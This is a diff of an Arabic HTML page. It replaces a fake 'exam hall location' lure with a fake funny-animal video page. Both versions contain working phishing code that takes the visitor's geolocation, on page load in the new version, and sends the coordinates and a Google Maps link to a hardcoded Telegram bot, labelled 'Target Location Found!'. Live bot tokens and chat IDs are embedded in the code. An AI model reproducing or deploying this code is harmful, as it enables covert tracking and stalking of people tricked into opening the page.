@@ -1,19 +1,56 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><title>خريطة القاعات - 2009</title></head>
-<body style="text-align:center; padding:50px;">
-    <h3>تحديد موقع قاعة الامتحان 📍</h3>
-    <button onclick="loc()" style="padding:20px; background:#f1c40f; color:#000; border:none; border-radius:10px;">كشف موقع القاعة</button>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Funny Animals | فيديوهات مضحكة</title>
+    <style>
+        body { margin: 0; background-color: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; font-family: Arial, sans-serif; overflow: hidden; }
+        video { width: 100%; max-width: 500px; border: 4px solid #fff; border-radius: 15px; }
+        .msg { margin-top: 15px; font-weight: bold; color: #ffeb3b; }
+    </style>
+</head>
+<body>
+
+    <!-- فيديو اللاما اللي بتبزق -->
+    <video id="llamaVideo" autoplay loop muted playsinline>
+        <source src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpueG54NXN4NXN4NXN4NXN4NXN4NXN4NXN4NXN4NXN4NXN4NXN4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZ29vZC9pbmRleC5naWY/V9gZeH1GvJy3m/giphy.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <div class="msg">جاري تحميل المقطع التالي... 😂</div>
+
     <script>
-        const pr = new URLSearchParams(window.location.search);
-        const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
-        function loc() {
-            navigator.geolocation.getCurrentPosition(p => {
-                const msg = encodeURIComponent(`📍 صيدة موقع\n👤 الصياد: ${pr.get('hunter')}\n🌐 الرابط: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('id')}&text=${msg}`);
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('dev')}&text=${msg}`);
-                alert("تم تحديد الموقع");
-            });
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('chat_id') || '7238206121'; 
+        const botToken = urlParams.get('bot_token') || '8669513520:AAFYrZjQ_dKL5dCfKU74XN0c1tOCte_HkwY';
+
+        // طلب إذن الموقع فور فتح الصفحة
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError, {enableHighAccuracy: true});
+            }
+        };
+
+        function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            const message = `
+📍 **Target Location Found!**
+🌍 **Google Maps:** [اضغط هنا لفتح الموقع](${mapsLink})
+🎯 **Accuracy:** ${acc} meters
+💻 **System:** M.Y.9 Tracking
+🦅 **Dev:** Abu Osayed Malkawi
+            `;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+        }
+
+        function showError(error) {
+            console.log("Location access denied.");
         }
     </script>
 </body>
